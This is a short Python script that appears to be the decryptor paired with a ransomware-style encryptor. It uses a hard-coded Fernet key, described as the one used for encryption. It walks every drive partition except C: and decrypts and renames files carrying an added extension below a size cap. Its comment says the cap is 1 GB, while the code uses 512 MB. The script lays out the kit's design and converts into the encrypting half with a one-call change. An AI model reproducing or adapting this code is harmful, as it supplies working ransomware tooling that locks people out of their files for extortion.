from cryptography.fernet import Fernet
import os, threading




# dec class
class Decrypt:
    def __init__(self,):
        self.KEY = b'M_N5tyvEVlZv5cS4DBceIMTL0IgJl47nP_fxnoll--8=' # the same key which was used in the encryption
        self.PARTITION_LIST = []  # for storing partition letters ex A,B,C ...


    def file_decrypter(self, file_name):
        fernet = Fernet(self.KEY)
        if os.path.exists(file_name):
            with open(file_name, 'rb') as file1:
                encrypted_data = file1.read()
            with open(file_name, "wb") as file2:
                file2.write(fernet.decrypt(encrypted_data))
            os.rename(file_name, os.path.splitext(file_name)[0])
            print("Decrypted => " + os.path.splitext(file_name)[0])


    # listing the files path
    def files_lister(self, partition_letter):
        for dire, sub_dir, files in os.walk(partition_letter):
            for file_name in files:
                abs_path = os.path.join(dire, file_name)
                # decrypt file which is less than 1Gb.
                if os.path.getsize(abs_path) < 536870912 and abs_path.count(".") == 2:
                    try:
                        self.file_decrypter(abs_path)
                    except:
                        pass

    def list_partitions(self):
        for character in range(65, 91):
            path = chr(character) + r":\\"
            if os.path.exists(path):
                self.PARTITION_LIST.append(path)
        self.PARTITION_LIST.remove(r"C:\\")
        for partition in self.PARTITION_LIST:
            thread1 = threading.Thread(target=self.files_lister, args=(partition,))
            thread1.start()
            thread1.join()


# class call
decrypt = Decrypt()
decrypt.list_partitions()
